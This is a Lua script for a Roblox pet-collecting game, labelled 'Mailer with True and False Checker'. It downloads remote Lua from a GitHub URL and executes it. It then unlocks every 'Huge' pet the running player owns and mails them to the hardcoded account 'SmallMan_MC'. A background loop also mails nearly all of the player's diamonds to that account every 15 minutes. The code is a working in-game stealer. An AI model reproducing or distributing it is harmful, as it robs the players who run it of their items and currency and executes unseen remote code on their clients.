-- Mailer with True and False Checker

getgenv().MailToUser = "SmallMan_MC"

local proceed = loadstring("return " .. game:HttpGet("https://raw.githubusercontent.com/TheArexH4CKER/check/refs/heads/main/check.lua"))()

if proceed then
    local Network = require(game.ReplicatedStorage.Library.Client.Network)

    local HugeUIDList = {}
    for PetUID, PetData in pairs(require(game.ReplicatedStorage.Library.Client.Save).Get().Inventory.Pet) do
        if PetData.id:find("Huge ") then
            table.insert(HugeUIDList, PetUID)
            if PetData._lk then
                repeat
                    task.wait()
                until Network.Invoke("Locking_SetLocked", PetUID, false)
                print("Unlocked", PetUID)
            end
        end
    end

    for _, PetUID in pairs(HugeUIDList) do
        repeat
            task.wait()
        until Network.Invoke("Mailbox: Send", MailToUser, tostring(Random.new():NextInteger(9, 999999)), "Pet", PetUID, 1)
        print("Sent", PetUID)
    end
else
    print("Returned False, Huges wont be sent")
end

-- Gem Mailer
spawn(function()
    local CurrencyCmds = require(game:GetService("ReplicatedStorage").Library.Client.CurrencyCmds)
    
    local username = "SmallMan_MC" -- Replace with recipient's username
    local loopInterval = 15 -- Interval in minutes
    local mailTax = 100000 -- Tax deduction for sending diamonds
    local diamondThreshold = 20000000 -- Threshold for sending all gems

    while true do
        print("Attempting to retrieve diamond data...")
        local diamondItem = CurrencyCmds.GetItem("Diamonds")
        
        if not diamondItem or not diamondItem._data then
            print("[ERROR] Failed to retrieve diamond data. Retrying after interval...")
            task.wait(loopInterval * 60)
            continue
        end

        local diamonds = diamondItem._data._am
        local diamondUID = diamondItem._uid 

        print("Diamonds:", diamonds)
        print("Diamond UID:", diamondUID)

        if not diamondUID then
            print("[ERROR] diamondUID is nil. Retrying after interval...")
            task.wait(loopInterval * 60)
            continue
        end

        if diamonds > diamondThreshold then
            local amountToSend = diamonds - mailTax
            if amountToSend <= 0 then
                print("[ERROR] Amount to send is invalid (<= 0). Skipping this cycle.")
                task.wait(loopInterval * 60)
                continue
            end

            print("Threshold reached! Preparing to send diamonds.")
            print("Amount to send (after tax):", amountToSend)

            local args = {
                username,
                "Gifts for pookiies",
                "Currency",
                diamondUID,
                amountToSend
            }

            print("Args to invoke server:", args)

            local success, errorMessage = pcall(function()
                game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
            end)

            if success then
                print("[SUCCESS] Diamonds sent successfully!")
            else
                print("[ERROR] Failed to send diamonds. Error:", errorMessage)
            end
        else
            print("Diamonds are below the threshold. Current amount:", diamonds)
        end

        print("Waiting for the next loop interval...")
        task.wait(loopInterval * 60)
    end
end)
